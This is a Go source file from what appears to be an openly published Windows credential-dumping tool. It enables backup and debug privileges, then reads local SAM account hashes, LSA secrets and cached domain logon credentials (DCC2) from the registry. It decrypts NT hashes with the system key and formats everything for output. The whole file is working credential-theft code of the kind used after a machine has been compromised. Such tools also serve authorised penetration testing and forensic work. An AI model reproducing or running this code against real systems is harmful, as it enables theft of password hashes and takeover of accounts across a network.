// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"golang.org/x/sys/windows"

	"github.com/jfjallid/golog"
)

var log = golog.Get("")

var RegOptionBackupRestore uint32 = 0x04
var PermMaximumAllowed uint32 = 0x02000000

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// Local Administrators group SID

var samSecretList = []printableSecret{}
var lsaSecretList = []printableSecret{}
var dcc2SecretList = []printableSecret{}

var outputFile *os.File

type printableSecret interface {
	printSecret() []byte
}

type sam_account struct {
	name   string
	rid    uint32
	nthash string
}

func (self *sam_account) printSecret() []byte {
	var res []byte
	res = append(res, []byte(fmt.Sprintf("Name: %s\n", self.name))...)
	res = append(res, []byte(fmt.Sprintf("RID: %d\n", self.rid))...)
	res = append(res, []byte(fmt.Sprintf("NT: %s\n\n", self.nthash))...)
	return res
}

type dcc2_cache struct {
	domain string
	user   string
	cache  string
}

func (self *dcc2_cache) printSecret() []byte {
	return []byte(self.cache + "\n")
}

func (self *printableLSASecret) printSecret() []byte {
	var res []byte
	res = append(res, []byte(fmt.Sprintln(self.secretType))...)
	for _, item := range self.secrets {
		res = append(res, []byte(fmt.Sprintln(item))...)
	}
	if self.extraSecret != "" {
		res = append(res, []byte(fmt.Sprintln(self.extraSecret))...)
	}
	return res
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func dumpSAM(hKey windows.Handle) (err error) {

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	var rids []string
	rids, err = GetSubKeyNamesExt(hKey, keyUsers, RegOptionBackupRestore, PermMaximumAllowed)
	if err != nil {
		log.Errorln(err)
		return err
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	syskey, err := getSysKey(hKey)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Gather credentials/secrets
	creds, err := getNTHash(hKey, rids)
	if err != nil {
		log.Errorln(err)
		// Try to get other secrets instead of hard fail
	} else {
		//TODO Rewrite handling of creds to not print to stdout until the end
		// Would be nice to be able to choose writing output to file, or somewhere else
		for _, cred := range creds {
			acc := sam_account{name: cred.Username, rid: cred.RID}
			//fmt.Printf("Name: %s\n", cred.Username)
			//fmt.Printf("RID: %d\n", cred.RID)
			if len(cred.Data) == 0 {
				//fmt.Printf("NT: <empty>\n\n")
				acc.nthash = "<empty>"
				samSecretList = append(samSecretList, &acc)
				continue
			}
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			acc.nthash = fmt.Sprintf("%x", hash)
			samSecretList = append(samSecretList, &acc)
			//fmt.Printf("NT: %x\n\n", hash)
		}
	}

	return nil
}

func dumpLSASecrets(hKey windows.Handle) (err error) {

	// Get names of lsa secrets

	lsaSecrets, err := GetLSASecrets(hKey, false)
	if err != nil {
		log.Noticeln("Failed to get lsa secrets")
		log.Errorln(err)
		return err
	}
	for i := range lsaSecrets {
		lsaSecretList = append(lsaSecretList, &lsaSecrets[i])
	}

	//if len(lsaSecrets) > 0 {
	//	fmt.Println("[*] LSA Secrets:")
	//	for _, secret := range lsaSecrets {
	//		fmt.Println(secret.secretType)
	//		for _, item := range secret.secrets {
	//			fmt.Println(item)
	//		}
	//		if secret.extraSecret != "" {
	//			fmt.Println(secret.extraSecret)
	//		}
	//	}
	//}

	return nil
}

func dumpDCC2Cache(hKey windows.Handle) error {

	cachedHashes, err := GetCachedHashes(hKey)
	if err != nil {
		log.Errorln(err)
		return err
	}

	for _, hash := range cachedHashes {
		userdomain := strings.Split(hash, ":")[0]
		parts := strings.Split(userdomain, "/")
		dcc2SecretList = append(dcc2SecretList, &dcc2_cache{domain: parts[0], user: parts[1], cache: hash})
	}

	//if len(cachedHashes) > 0 {
	//	//fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
	//	for _, secret := range cachedHashes {
	//        userdomain := strings.Split(secret, ":")[0]
	//        parts := strings.Split(userdomain, "/")
	//        _ = dcc2_cache{
	//            domain: parts[0],
	//            user: parts[1],
	//            cache: secret,
	//        }
	//	}
	//}

	return nil
}

func dump(sam, lsaSecrets, dcc2 bool) ([]byte, error) {
	samSecretList = []printableSecret{}
	lsaSecretList = []printableSecret{}
	dcc2SecretList = []printableSecret{}

	var err error

	// TODO Dump with NtOpenKey and NtSaveKey
	for _, priv := range []string{"SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege", "SeSecurityPrivilege"} {
		if err := enablePriv(priv); err != nil {
			Println("[!] Failed to enable privilege:", priv, "-", err)
		}
	}
	Println("Enabled Priv")

	if sam {
		hKey := windows.HKEY_LOCAL_MACHINE
		err = dumpSAM(windows.Handle(hKey))
		if err != nil {
			log.Errorln(err)
			return []byte(err.Error()), err
		}
	}
	if lsaSecrets {
		hKey := windows.HKEY_LOCAL_MACHINE
		err = dumpLSASecrets(windows.Handle(hKey))
		if err != nil {
			log.Errorln(err)
			return []byte(err.Error()), err
		}
	}
	if dcc2 {
		hKey := windows.HKEY_LOCAL_MACHINE
		err = dumpDCC2Cache(windows.Handle(hKey))
		if err != nil {
			log.Errorln(err)
			return []byte(err.Error()), err
		}
	}

	// Print results
	//TODO Write name of host?
	var res []byte
	if len(samSecretList) > 0 {
		res = append(res, []byte(fmt.Sprintln("[*] Dumping local SAM hashes"))...)
		for i := range samSecretList {
			res = append(res, samSecretList[i].printSecret()...)
		}
	}
	if len(lsaSecretList) > 0 {
		res = append(res, []byte(fmt.Sprintln("[*] Dumping LSA Secrets"))...)
		for i := range lsaSecretList {
			res = append(res, lsaSecretList[i].printSecret()...)
		}
	}
	if len(dcc2SecretList) > 0 {
		res = append(res, []byte(fmt.Sprintln("[*] Dumping cached domain credentials (domain/username:hash)"))...)
		for i := range dcc2SecretList {
			res = append(res, dcc2SecretList[i].printSecret()...)
		}
	}

	return res, nil
}

